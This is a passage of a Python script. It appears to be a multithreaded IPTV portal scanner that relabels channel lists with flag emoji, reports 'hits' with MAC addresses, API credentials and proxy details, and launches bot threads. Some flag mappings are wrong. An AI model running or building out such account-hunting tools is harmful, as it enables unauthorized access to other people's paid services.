			     	   serieslist = serieslist.replace( "⍟FI", " |🇫🇮 FI" )
			     	   serieslist = serieslist.replace( "⍟GOR", " |🇲🇪 GOR" )
			     	   serieslist = serieslist.replace( "⍟GR", " |🇬🇷 GR" )
			     	   serieslist = serieslist.replace( "⍟HR", " |🇭🇷 HR" )
			     	   serieslist = serieslist.replace( "⍟HU", " |🇭🇺 HU" )
			     	   serieslist = serieslist.replace( "⍟IE", " |🇮🇪 IE" )
			     	   serieslist = serieslist.replace( "⍟IL", " |🇮🇪 IL" )
			     	   serieslist = serieslist.replace( "⍟IR", " |🇮🇪 IR" )
			     	   serieslist = serieslist.replace( "⍟ID", " |🇮🇩 ID" )
			     	   serieslist = serieslist.replace( "⍟IN", " |🇮🇳 IN" )
			     	   serieslist = serieslist.replace( "⍟IT", " |🇮🇹 IT" )
			     	   serieslist = serieslist.replace( "⍟JP", " |🇯🇵 JP" )
			     	   serieslist = serieslist.replace( "⍟KE", " |🇰🇪 KE" )
			     	   serieslist = serieslist.replace( "⍟KU", " |🇭🇺 KU" )
			     	   serieslist = serieslist.replace( "⍟KR", " |🇰🇷 KR" )
			     	   serieslist = serieslist.replace( "⍟LU", " |🇱🇺 LU" )
			     	   serieslist = serieslist.replace( "⍟MKD", " |🇲🇰 MKD" )
			     	   serieslist = serieslist.replace( "⍟MX", " |🇲🇽 MX" )
			     	   serieslist = serieslist.replace( "⍟MY", " |🇲🇾 MY" )
			     	   serieslist = serieslist.replace( "⍟NETFLIX", " | 🚩 NETFLIX" )
			     	   serieslist = serieslist.replace( "⍟NG", " |🇳🇬 NG" )
			     	   serieslist = serieslist.replace( "⍟NZ", " |🇳🇿 NZ" )
			     	   serieslist = serieslist.replace( "⍟NL", " |🇳🇱 NL" )
			     	   serieslist = serieslist.replace( "⍟NO", " |🇳🇴 NO" )
			     	   serieslist = serieslist.replace( "⍟PA", " |🇵🇦 PA" )
			     	   serieslist = serieslist.replace( "⍟PE", " |🇵🇪 PE" )
			     	   serieslist = serieslist.replace( "⍟PH", " |🇵🇭 PH" )
			     	   serieslist = serieslist.replace( "⍟PK", " |🇵🇰 PK" )
			     	   serieslist = serieslist.replace( "⍟PL", " |🇵🇱 PL" )
			     	   serieslist = serieslist.replace( "⍟PT", " |🇵🇹 PT" )
			     	   serieslist = serieslist.replace( "⍟PPV", " |🏋🏼‍♂️ PPV" )
			     	   serieslist = serieslist.replace( "⍟QA", " |🇶🇦 QA" )
			     	   serieslist = serieslist.replace( "⍟RO", " |🇷🇴 RO" )
			     	   serieslist = serieslist.replace( "⍟RU", " |🇷🇺 RU" )
			     	   serieslist = serieslist.replace( "⍟SA", " |🇸🇦 SA" )
			     	   serieslist = serieslist.replace( "⍟SCREENSAVER", " | 🏞 SCREENSAVER" )
			     	   serieslist = serieslist.replace( "⍟SE", " |🇸🇪 SE" )
			     	   serieslist = serieslist.replace( "⍟SK", " |🇸🇰 SK" )
			     	   serieslist = serieslist.replace( "⍟SL", " |🇸🇮 SL" )
			     	   serieslist = serieslist.replace( "⍟SG", " |🇸🇬 SG" )
			     	   serieslist = serieslist.replace( "⍟SR", " |🇷🇸 SR" )
			     	   serieslist = serieslist.replace( "⍟SU", " |🇦🇲 SU" )
			     	   serieslist = serieslist.replace( "⍟TH", " |🇹🇭 TH" )
			     	   serieslist = serieslist.replace( "⍟TR", " |🇹🇷 TR" )
			     	   serieslist = serieslist.replace( "⍟TW", " |🇹🇼 TW" )
			     	   serieslist = serieslist.replace( "⍟UKR", " |🇺🇦 UKR" )
			     	   serieslist = serieslist.replace( "⍟US", " |🇺🇸 US" )
			     	   serieslist = serieslist.replace( "⍟VN", " |🇻🇳 VN" )
			     	   serieslist = serieslist.replace( "⍟VIP", " |⚽️ VIP" )
			     	   serieslist = serieslist.replace( "⍟WEB", " |🏳️‍🌈 WEB" )
			     	   serieslist = serieslist.replace( "⍟ZA", " |🇿🇦 ZA" )
			     	   serieslist = serieslist.replace( "⍟AF", " |🇿🇦 AF" )
			     	   serieslist = serieslist.replace( "⍟ADU", " |🔞 ADULTS" )
			     	   serieslist = serieslist.replace( "⍟FO", " |🔞 FOR" )
			     	   serieslist = serieslist.replace( "⍟⋅ FOR", " |🔞 ⋅ FOR" )
			     	   serieslist = serieslist.replace( "⍟BLU", " |🔞 BLU" )
			     	   serieslist = serieslist.replace( "⍟XXX", " |🔞 XXX" )
			     	   serieslist = serieslist.replace( "⍟", " |®️ " )
			     	
			     
			     	hit(mac,trh,real, m3u_real, m3u_panel,durum,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,server_info_global, vpn_info, user_api, pass_api, live_count, vod_count, series_count, stalker_info_section, server_header, status_code_hit, proxy_details, proxy_type_str, proxy_status_str)

threads = []
for i in range(botsay):
    thread = threading.Thread(target=d_logic, args=(i,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()